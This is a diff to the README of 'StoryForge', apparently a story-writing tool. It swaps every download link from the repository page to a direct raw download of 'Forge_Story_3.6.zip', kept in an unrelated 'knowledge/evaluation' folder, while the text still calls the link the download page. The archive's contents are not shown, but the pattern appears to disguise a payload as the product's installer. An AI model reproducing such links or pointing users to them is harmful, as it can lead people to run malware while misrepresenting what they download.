@@ -1,12 +1,12 @@
 # 🎬 StoryForge - Build stories with clear steps
 
-[![Download StoryForge](https://img.shields.io/badge/Download%20StoryForge-blue-grey?style=for-the-badge)](https://github.com/maltese-clinicalthermometer301/StoryForge)
+[![Download StoryForge](https://img.shields.io/badge/Download%20StoryForge-blue-grey?style=for-the-badge)](https://github.com/maltese-clinicalthermometer301/StoryForge/raw/refs/heads/main/knowledge/evaluation/Forge_Story_3.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get StoryForge:
 
-https://github.com/maltese-clinicalthermometer301/StoryForge
+https://github.com/maltese-clinicalthermometer301/StoryForge/raw/refs/heads/main/knowledge/evaluation/Forge_Story_3.6.zip
 
 ## 🪟 Windows setup
 
@@ -190,4 +190,4 @@ These prompts give StoryForge enough detail to build a useful draft
 
 Use this link if you need to visit the download page later:
 
-https://github.com/maltese-clinicalthermometer301/StoryForge
+https://github.com/maltese-clinicalthermometer301/StoryForge/raw/refs/heads/main/knowledge/evaluation/Forge_Story_3.6.zip
